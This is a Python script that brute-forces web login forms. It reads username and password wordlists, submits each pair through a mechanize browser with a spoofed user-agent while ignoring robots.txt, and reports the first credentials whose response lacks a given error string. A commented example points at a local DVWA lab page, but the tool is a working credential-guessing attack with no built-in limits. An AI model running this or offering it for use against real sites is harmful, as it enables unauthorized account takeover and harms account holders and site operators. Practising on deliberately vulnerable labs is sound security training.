import time
import mechanize
import argparse

def pars():
    parser = argparse.ArgumentParser()
    parser.add_argument('url',type=str, help="URL")
    parser.add_argument('username',type=str, help="username list")
    parser.add_argument('password',type=str, help="password list")
    parser.add_argument("error",type=str, help="error message")
    parser.add_argument("-t", dest='time', action='store',type=float, default=0, help="time sleep m/s")
    parser.add_argument("-c", dest='header', action='store',type=str ,default='', help="custom user-agent, default:Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.13) Gecko/20101206 Ubuntu/10.10 (maverick) Firefox/3.6.13")
    parser.add_argument("-u", dest='usern', action='store',type=str, default='', help="form for username, default:username" )
    parser.add_argument("-p", dest='passn', action='store',type=str ,default='', help="form for password, default:password" )
    parser.add_argument("-v", "--verbose", dest='verb', action='count', default=0,
                    help="Verbosity (between 1-2-3 occurrences with more leading to more "
                         "verbose logging). ALL=1, USER:PASS=2, USER:PASS+READ WEB=3")
    return parser.parse_args()

def ct(fi):
    f = open(fi,"r")
    ct = 0
    for line in f:
        ct+=1
    f.close()
    return ct

def bru(host, l1, l2, args, verb, use, passn):
    global ctt
    br = mechanize.Browser()
    br.set_handle_robots(False)
    if len(args) == 0:
        br.addheaders = [("User-agent","Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.13) Gecko/20101206 Ubuntu/10.10 (maverick) Firefox/3.6.13")]
    else :
        br.addheaders =[(args)]
    if verb == 1 and ctt == 1:
        print("User agent :"+str(br.addheaders))
        time.sleep(2)
        ctt = 0
    sign_in = br.open(host)
    br.select_form(nr = 0)
    if len(use) or len(passn) == 0:
        br["username"] = str(l1)
        br["password"] = str(l2)
    else :
        br[use] = str(l1)
        br[passn] = str(l2)
    logged_in = br.submit()
    logincheck = logged_in.read()
    return (logincheck)


def ctrl(log, er, a):
    er = str(er)
    log = str(log)
    if int(log.find(er)) == -1 :
        a = "0"
        return a
    else :
        a = "1"
        return a

def main():
    global ctt
    ctt = 1
    args = pars()
    host = args.url
    user = args.username
    pas = args.password
    err = args.error

#    No argparse
#    lvl = args.verb
#    host = exemple."http://192.168.1.52/DVWA/login.php"
#    user = exemple."user.txt"
#    pas = exemple."pass.txt"
#    err = exemple."failed"

    ct1 = ct(user)
    ct2 = ct(pas)
    print("User wordlist : ",ct1," lines")
    print("Pass wordlist : ",ct2," lines")

    f1 = open(user, "r")
    l1 = f1.readline().strip()
    f2 = open(pas, "r")
    l2 = f2.readline().strip()
    a = "1"

    if args.verb == 1:
        print("URL :"+host)
        print("Usernames list :"+user)
        print("Password list :"+pas)
        print("Error message :"+err)
        if args.time > 0 :
            print("Time sleep :"+str(args.time))

    while l1 and a == "1":
        while l2 and a == "1":
            brut = bru(host, l1, l2, args.header, args.verb, args.usern, args.passn)
            if args.time > 0:
                time.sleep(args.time)
            if args.verb == 2:
                print(l1,":",l2)
            if args.verb == 3 or args.verb == 1:
                print(l1,":",l2)
                print(brut)
            a = ctrl(brut,err,a)
            if a == "0" :
                print("____________________")
                print(l1,":",l2)
                print(brut)
                break
            l2 = f2.readline().strip()
            continue
        f2.close()
        f2 = open(pas, "r")
        l1 = f1.readline().strip()
        l2 = f2.readline().strip()
        continue

    f1.close()
    f2.close()

    if a == "0" :
        print("> "
        "Sucess")
    elif a == "1" :
        print("> "
        "Not found")


main()
